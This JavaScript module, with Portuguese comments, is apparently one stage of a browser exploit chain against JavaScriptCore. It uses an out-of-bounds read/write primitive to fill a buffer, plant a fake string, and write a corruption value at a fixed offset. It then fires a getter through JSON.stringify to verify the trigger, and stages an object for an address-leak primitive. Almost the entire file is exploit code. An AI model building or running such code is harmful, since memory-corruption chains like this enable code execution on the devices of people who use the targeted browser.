// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, stringToAdvancedInt64Array } from '../utils.mjs'; // Presume stringToAdvancedInt64Array existe
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForTriggerVerify"; // Novo nome para este teste
let getter_called_flag = false;
let current_test_results = { /* ... estrutura de resultados ... */ };

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_FOR_GETTER_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Usar o valor que sabemos que funciona

const OOB_AB_FILL_PATTERN_CHECK = 0xFEFEFEFE;
const OOB_AB_SNOOP_SIZE_CHECK = 0x400; 

const FAKE_STRING_PLANT_OFFSET_CHECK = 0x180; 
const FAKE_STRING_PLANTED_CHECK = "====STRING_FOR_LATER_IF_GETTER_WORKS====";

let global_object_for_addrof_check; 

class CheckpointForTriggerVerify {
    constructor(id) {
        this.id_marker = `TriggerVerifyChkpt-${id}`;
        this.prop_to_process = null; 
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "TriggerVerify_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { 
            success: false, message: "Getter chamado. Verificando oob_ab.",
            error: null, leaks_in_oob_ab: [], details:""
        };
        // Simplesmente logar que foi chamado e ler algo do oob_ab para confirmar que está ok.
        try {
            if (!oob_array_buffer_real || !oob_read_absolute) throw new Error("oob_ab/read ausente");
            const val_check = oob_read_absolute(FAKE_STRING_PLANT_OFFSET_CHECK, 8); // Ler parte da string plantada
            current_test_results.details = `String plantada (primeiros 8B) em ${toHex(FAKE_STRING_PLANT_OFFSET_CHECK)}: ${val_check.toString(true)}.`;
            logS3(`DENTRO DO GETTER: ${current_test_results.details}`, "info", FNAME_GETTER);
            current_test_results.success = true; // Sucesso se o getter for chamado e pudermos ler
            current_test_results.message = "Getter chamado, oob_ab acessível.";
        } catch (e) {
            current_test_results.error = String(e);
            current_test_results.message = `Erro no getter: ${e.message}`;
            logS3(`DENTRO DO GETTER: ERRO: ${e.message}`, "error", FNAME_GETTER);
        }
        return { "getter_trigger_verify_done": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForTriggerVerify.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME]; 
        return { id: this.id_marker, propVal: this.prop_to_process, processed_by_trigger_verify: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeTriggerVerificationTest";
    logS3(`--- Iniciando Teste de Verificação do Gatilho do Getter com Setup Completo ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, leaks_in_oob_ab: [], details:"" };
    global_object_for_addrof_check = null;

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // 1. Preencher oob_array_buffer_real com padrão
        const fill_limit_r = Math.min(OOB_AB_SNOOP_SIZE_CHECK, oob_array_buffer_real.byteLength);
        logS3(`Preenchendo oob_ab de 0 a ${toHex(fill_limit_r)} com ${toHex(OOB_AB_FILL_PATTERN_CHECK)} (exceto área do gatilho)...`, "info", FNAME_TEST_RUNNER);
        for (let offset = 0; offset < fill_limit_r; offset += 4) {
             if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) continue;
             try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN_CHECK, 4); } catch(e){}
        }
        logS3("oob_array_buffer_real preenchido com padrão.", "info", FNAME_TEST_RUNNER);

        // 2. Plantar a STRING FALSA no oob_array_buffer_real
        if (typeof stringToAdvancedInt64Array === "function") {
            const fake_str_bytes = stringToAdvancedInt64Array(FAKE_STRING_PLANTED_CHECK, true); 
            let write_at_str = FAKE_STRING_PLANT_OFFSET_CHECK;
            for(const adv64 of fake_str_bytes) {
                if (write_at_str + 8 <= oob_array_buffer_real.byteLength) {
                    oob_write_absolute(write_at_str, adv64, 8); write_at_str += 8;
                } else break;
            }
            logS3(`String "${FAKE_STRING_PLANTED_CHECK}" plantada em oob_data[${toHex(FAKE_STRING_PLANT_OFFSET_CHECK)}]`, "info", FNAME_TEST_RUNNER);
        } else {
            logS3("AVISO: stringToAdvancedInt64Array não disponível. String falsa não plantada.", "warn", FNAME_TEST_RUNNER);
        }

        // 3. Escrita OOB Gatilho: USAR O VALOR QUE SABEMOS QUE FUNCIONA (0xFFF...)
        logS3(`Realizando escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} com ${CORRUPTION_VALUE_FOR_GETTER_TRIGGER.toString(true)}...`, "info", FNAME_TEST_RUNNER);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_FOR_GETTER_TRIGGER, 8);
        logS3(`Escrita OOB gatilho com ${CORRUPTION_VALUE_FOR_GETTER_TRIGGER.toString(true)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForTriggerVerify(1);
        global_object_for_addrof_check = { "id_global": "GlobalTarget", "val": Math.random() };
        checkpoint_obj.prop_to_process = global_object_for_addrof_check;
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    if (getter_called_flag) {
        logS3(`RESULTADO VERIFICAÇÃO GATILHO: GETTER FOI CHAMADO! (Sucesso=${current_test_results.success}). Msg: ${current_test_results.message}`, 
              current_test_results.success ? "good" : "warn", FNAME_TEST_RUNNER);
        if (current_test_results.details) logS3(`  Detalhes do getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
    } else {
        logS3("RESULTADO VERIFICAÇÃO GATILHO: GETTER NÃO FOI CHAMADO.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    global_object_for_addrof_check = null;
    logS3(`--- Teste de Verificação do Gatilho Concluído ---`, "test", FNAME_TEST_RUNNER);
}
